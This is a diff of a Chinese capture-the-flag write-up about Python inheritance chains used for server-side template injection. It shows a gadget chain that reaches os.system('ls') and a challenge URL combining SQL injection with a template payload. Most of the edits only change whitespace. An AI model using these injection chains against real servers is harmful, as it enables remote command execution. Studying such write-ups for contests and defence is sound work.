@@ -1,8 +1,7 @@
-<center>python继承链和题解综合</center>
 
 # Forward
 
-​	之前好像打网鼎杯ssti被虐了一次,当时就打算对这个进行一下研究，后来忙忘记最近有个山东省赛的题目又把我折腾了好久，所以这次就下定决心进行一波python继承链的分析和学习
+​	之前好像打网鼎杯ssti被虐了一次,当时就打算对这个进行一下研究，后来忙忘记最近有个山东省赛的题目又把我折腾了好久，所以这次就下定决心进行一波python继承链的分析和学习  
 
 
 
@@ -42,7 +41,7 @@
 
 
 
-# python继承链原理
+# python继承链原理  
 
 
 
@@ -50,9 +49,10 @@
 
 `[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')`
 
+ 
+ 
 
-
-# 题目分析
+# 题目分析  
 
 http://47.105.148.65:29003/?username=
 
@@ -167,9 +167,9 @@ http://47.105.148.65:29003/?username=-1' union select 1,'{{().__class__.__bases_
 
 
 
-## 解决命令无结果回显问题
+## 解决命令无结果回显问题  
 
-**os.system() 和 os.open()两者的区别**:
+**os.system() 和 os.open()两者的区别**:  
 
 查阅文档 [os官方文档](https://docs.python.org/2/library/os.html)
 
@@ -181,7 +181,8 @@ http://47.105.148.65:29003/?username=-1' union select 1,'{{().__class__.__bases_
 Changes to sys.stdin, etc. are not reflected in the environment of the executed command.On Unix, the return value is the exit status of the process encoded in the format specified for wait()
 ```
 
-这里看出来了标准输入 输出等等不会返回在终端 返回的事exit status code
+
+这里看出来了标准输入 输出等等不会返回在终端 返回exit status code    
 
 >
 >
